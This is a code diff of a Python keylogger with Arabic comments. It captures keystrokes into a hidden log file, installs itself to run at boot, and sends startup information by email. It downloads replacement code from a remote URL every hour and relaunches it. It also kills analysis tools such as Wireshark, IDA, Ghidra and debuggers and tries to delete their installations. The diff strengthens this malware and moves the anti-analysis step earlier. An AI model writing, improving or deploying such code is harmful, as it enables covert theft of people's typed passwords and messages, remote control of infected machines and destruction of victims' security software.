@@ -62,8 +62,11 @@ key_mapping = {
     'Key.f6': '[F6]', 'Key.f7': '[F7]', 'Key.f8': '[F8]', 'Key.f9': '[F9]', 'Key.f10': '[F10]',
     'Key.f11': '[F11]', 'Key.f12': '[F12]',
 }
-
-# ===== إرسال البريد =====
+log_file = os.path.join(
+    os.path.expanduser("~"),
+    ".local" if platform.system() != "Windows" else "AppData\\Roaming",
+    "spup_log.txt"
+)
 # ===== إرسال البريد =====
 def send_email(subject, content):
     try:
@@ -234,14 +237,27 @@ def update_script():
     try:
         response = requests.get(update_url, timeout=10)
         if response.status_code == 200:
-            with open(__file__, 'w') as f:
+            if getattr(sys, 'frozen', False):
+                # يعمل من ملف تنفيذي (مثل .exe)
+                script_dir = os.path.dirname(sys.executable)
+                new_script_path = os.path.join(script_dir, "update.py")
+            else:
+                # يعمل كـ .py
+                new_script_path = __file__
+
+            with open(new_script_path, 'w') as f:
                 f.write(response.text)
-            print("[+] Script updated successfully.")
+            print(f"[+] Script updated successfully: {new_script_path}")
+
+            # إعادة التشغيل من السكربت الجديد إذا كان يعمل من ملف تنفيذي
+            if getattr(sys, 'frozen', False):
+                subprocess.Popen(["python3", new_script_path])
+                sys.exit(0)
+
         else:
             print(f"[-] Failed to download update. Status Code: {response.status_code}")
     except requests.exceptions.RequestException as e:
         print(f"[-] Update error: {e}")
-
 # ===== التقاط الضغطات =====
 def on_press(key):
     try:
@@ -263,9 +279,11 @@ def on_press(key):
 
 # ===== بدء تشغيل اللوجر =====
 def start_logger():
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
-
+    try:
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception as e:
+        print(f"[!] Logger error: {e}")
 # ===== حفظ البرنامج في الخلفية =====
 
 def persist_script(output_filename):
@@ -405,31 +423,38 @@ def is_admin():
     try:
         if os.name == 'nt':
             # Windows
-            return os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin()
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
         else:
-            # Linux/macOS
-            return os.getuid() == 0
-    except:
+            # Unix-like
+            return os.geteuid() == 0
+    except Exception as e:
+        print(f"[!] is_admin() check failed: {e}")
         return False
 
+
 def kill_if_running(proc_name):
+    current_pid = os.getpid()
     for proc in psutil.process_iter(['name', 'pid']):
         try:
-            if proc_name.lower() in proc.info['name'].lower():
-                print(f"[!] Found: {proc.info['name']} (PID: {proc.info['pid']})")
+            pname = proc.info['name']
+            pid = proc.info['pid']
+
+            if proc_name.lower() in pname.lower() and pid != current_pid:
+                print(f"[!] Found: {pname} (PID: {pid})")
                 try:
                     proc.kill()
-                    print(f"[+] Killed {proc.info['name']}")
+                    print(f"[+] Killed {pname}")
                 except psutil.AccessDenied:
-                    print(f"[-] Access denied to kill {proc.info['name']} - Skipping")
+                    print(f"[-] Access denied to kill {pname} - Skipping")
                 except Exception as e:
-                    print(f"[-] Error killing {proc.info['name']}: {e}")
+                    print(f"[-] Error killing {pname}: {e}")
         except (psutil.NoSuchProcess, psutil.AccessDenied):
             continue
 
+
 def delete_app_if_possible(app_path):
-    if os.path.exists(app_path):
-        try:
+    try:
+        if os.path.exists(app_path):
             if os.access(app_path, os.W_OK):
                 if os.path.isdir(app_path):
                     shutil.rmtree(app_path)
@@ -438,8 +463,8 @@ def delete_app_if_possible(app_path):
                 print(f"[+] Removed app: {app_path}")
             else:
                 print(f"[-] No permission to delete {app_path}")
-        except Exception as e:
-            print(f"[-] Failed to delete {app_path}: {e}")
+    except Exception as e:
+        print(f"[-] Failed to delete {app_path}: {e}")
 
 def detect_and_block_tools():
     system = platform.system()
@@ -447,7 +472,6 @@ def detect_and_block_tools():
     is_root = is_admin()
     print(f"[*] OS Detected: {system} | User: {current_user} | Root/Admin: {is_root}")
 
-    # 🔎 أدوات مراقبة وتحليل شائعة
     suspicious_processes = [
         "wireshark", "tcpdump", "fiddler", "procmon", "processhacker",
         "ollydbg", "x64dbg", "ida64", "ida", "regshot", "dumpcap",
@@ -456,25 +480,25 @@ def detect_and_block_tools():
         "ghidra", "volatility", "sleuthkit", "autopsy"
     ]
 
-    # 🔐 مسارات شائعة لحذف الأدوات (إذا ممكن)
     known_paths = {
         "Windows": [
-            "C:\\Program Files\\Wireshark\\",
-            "C:\\Program Files\\Process Hacker 2\\",
-            "C:\\Program Files\\IDA Pro\\"
+            r"C:\Program Files\Wireshark\\",
+            r"C:\Program Files\Process Hacker 2\\",
+            r"C:\Program Files\IDA Pro\\"
         ],
         "Linux": [
             "/usr/bin/wireshark", "/usr/bin/ida64", "/usr/bin/gdb"
         ],
-        "Darwin": [  # macOS
+        "Darwin": [
             "/Applications/Wireshark.app/",
             "/Applications/IDA Pro.app/",
         ]
     }
 
     print("[*] Searching for known processes...")
+    current_pid = os.getpid()
     for proc in suspicious_processes:
-        kill_if_running(proc)
+        kill_if_running(proc)  # الدالة محدثة سابقًا لتجنب قتل النفس
 
     print("[*] Attempting to delete known app paths (if accessible)...")
     for path in known_paths.get(system, []):
@@ -482,13 +506,17 @@ def detect_and_block_tools():
 
     print("[+] Anti-analysis operations completed.\n")
 
-# ===== تشغيل البرنامج بشكل دائم =====
+
 def run_every_hour():
     while True:
         time.sleep(3600)
-        update_script()  # تحديث السكربت كل ساعة
+        try:
+            update_script()
+        except Exception as e:
+            print(f"[!] Failed to update script: {e}")
 
-# ===== تشغيل السكربت =====
+
+# ===== تشغيل البرنامج الرئيسي =====
 if __name__ == "__main__":
     if is_watcher:
         print("[*] Running in watcher mode...")
@@ -496,9 +524,11 @@ if __name__ == "__main__":
     else:
         print("[*] Running as primary script...")
 
-        # 1. تثبيت السكربت كخدمة تعمل عند الإقلاع
-        persist_script(os.path.basename(__file__))
+        # 1. التثبيت كخدمة
+        persist_script(os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__))
 
+        # 2. الحماية من التحليل
+        detect_and_block_tools()
 
         # 3. بدء تسجيل المفاتيح في الخلفية
         threading.Thread(target=start_logger, daemon=True).start()
@@ -506,10 +536,8 @@ if __name__ == "__main__":
         # 4. إرسال معلومات التشغيل
         send_startup_info()
 
-        # 5. تحديث السكربت عند البداية
+        # 5. التحديث عند البداية
         update_script()
 
-        # 6. تحديث السكربت كل ساعة بشكل مستمر
+        # 6. التحديث كل ساعة
         run_every_hour()
-        
-        detect_and_block_tools()
